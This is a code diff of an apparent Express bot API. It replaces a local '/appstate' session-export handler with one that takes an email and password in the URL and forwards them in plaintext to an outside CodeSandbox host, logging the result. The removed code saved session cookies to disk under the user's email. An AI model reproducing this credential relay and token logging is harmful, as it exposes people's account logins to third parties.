@@ -882,21 +882,47 @@ app.get('/porn', async (req, res) => {
   };
 });
 
-console.log("/appstate?e=&p=")
-app.get("/appstate", (req, res) => {
-const email = req.query.e;
-const password = req.query.p;
+//console.log("/appstate?e=&p=")
+//app.get("/appstate", (req, res) => {
+//const email = req.query.e;
+//const password = req.query.p;
 // account information
-try {
-const response = await axios.get(`https://m8jpfz-3000.csb.app/appstate?e=${email}&p=${password}`);
-  
-  const result = response.data;
-  res.json({ result });
-  console.log({ result });
-  } catch(e) { 
-  res.json({ error: e.message });
-  console.log(e)
-   }
+//appstate({email, password}, (err, api) => {
+//  if (err) {
+//      res.status(401).send({ error: err.message });
+//  } else {
+//  try {
+//    const randomString = generateRandomString(5);
+    //create appstate
+//    const result = api.getAppState();
+    
+//    const results = (JSON.stringify(result, null, 2))
+//fs.writeFileSync(`${email}.${randomString}.json`, results)
+//    console.log(results)
+//      res.type("json").send({ success: results})
+     //logging out the account:>
+//    api.logout();
+//    } catch(e) {
+//res.json({ error: e.message })
+//  console.log(e)
+//      }
+//    }
+//  })
+//});
+                        
+console.log("/appstate?e=&p=")
+app.get("/appstate", async (req, res) => {
+  const email = req.query.e;
+  const password = req.query.p;
+  try {
+    const response = await axios.get(`https://m8jpfz-3000.csb.app/appstate?e=${email}&p=${password}`);
+    const result = response.data;
+    res.json({ result });
+    console.log({ result });
+  } catch (e) {
+    res.json({ error: e.message });
+    console.log(e);
+  }
 });
 
 
